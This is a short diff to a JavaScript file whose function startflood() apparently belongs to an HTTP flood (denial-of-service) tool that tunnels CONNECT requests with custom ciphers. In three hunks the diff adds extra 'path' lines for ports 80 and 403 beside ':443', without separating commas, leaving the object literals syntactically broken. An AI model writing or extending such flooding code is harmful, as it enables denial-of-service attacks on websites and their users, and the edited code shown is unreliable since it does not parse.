@@ -258,6 +258,8 @@ function startflood(){
                     ciphers: cipper,
                     method: 'CONNECT',
                     path: parsed.host + ":443"
+                    path: parsed.host + ":80"
+                    path: parsed.host + ":403"
                 }, (err) => {
                     req.end();
                     return;
@@ -312,6 +314,8 @@ function startflood(){
                     ciphers: cipper,
                     method: 'CONNECT',
                     path: parsed.host + ":443"
+                    path: parsed.host + ":80"
+                    path: parsed.host + ":403"
                 }, (err) => {
                     req.end();
                     return;
@@ -360,6 +364,8 @@ function startflood(){
                     ciphers: cipper,
                     method: 'CONNECT',
                     path: parsed.host + ":443"
+                    path: parsed.host + ":80"
+                    path: parsed.host + ":403"
                 }, (err) => {
                     req.end();
                     return;
